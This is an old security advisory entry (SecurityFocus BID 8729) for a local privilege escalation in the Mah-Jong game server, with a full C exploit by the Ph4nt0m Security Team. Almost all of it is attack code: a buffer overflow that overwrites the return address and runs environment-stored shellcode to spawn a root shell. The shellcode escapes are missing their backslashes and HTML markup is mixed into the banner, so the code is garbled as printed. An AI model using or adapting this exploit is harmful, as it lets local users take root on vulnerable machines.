source: http://www.securityfocus.com/bid/8729/info

A problem in the handling of large requests supplied with certain flags has been reported in Maj-Jong. Because of this, it may be possible for a local attacker to gain elevated privileges.

/*
*   mj-server(client) local root(possible in debian)  exploit
*   test in (redhat7.2----redhat8.0)
*   coded by jsk
*
*  (c) Ph4nt0m Security Team  /www.ph4nt0m.org
*
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUFSIZE 150


char shellcode[] =
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"
"x31xc0x31xdbxb0x17xcdx80xebx1fx5ex89x76x08x31"
"xc0x88x46x07x89x46x0cxb0x0bx89xf3x8dx4ex08x8d"
"x56x0cxcdx80x31xdbx89xd8x40xcdx80xe8xdcxffxff"
"xffx2fx62x69x6ex2fx73x68x58";
void banner (void);

void banner (void)
{
fprintf (stdout, "\n [+] mj-server local  exploit
mail:<jsk@ph4nt0m.net>");
fprintf (stdout, "\n [+] by jsk < <a href="http://www.ph4nt0m.org"
target="_blank"><a href="http://www.ph4nt0m.org"
target="_blank">www.ph4nt0m.org</a></a>> talk with me <irc.0x557.org
#ph4nt0m> ");
fprintf (stdout, "\n [+] spawning shell \n\n");
}

int main(void)
{
    char buf[BUFSIZE+16];
    char *prog[] = {"/home/mj-1.4-src/mj-server","--server", buf, NULL};
    char *env[] = {"HOME=jsk", shellcode, NULL};
    unsigned long ret = 0xc0000000 - sizeof(void *) - strlen(prog[0]) -
    strlen(shellcode) - 0x02;
    memset(buf,0x41,sizeof(buf));
    memcpy(buf+BUFSIZE,(char *)&ret,4);
    memcpy(buf+BUFSIZE+4,(char *)&ret,4);
    memcpy(buf+BUFSIZE+8,(char *)&ret,4);
    buf[BUFSIZE+12] = 0x00;
    printf("\n [+] Using address: 0x%x", ret);
    banner ();
    execve(prog[0],prog,env);
    return 0;
}

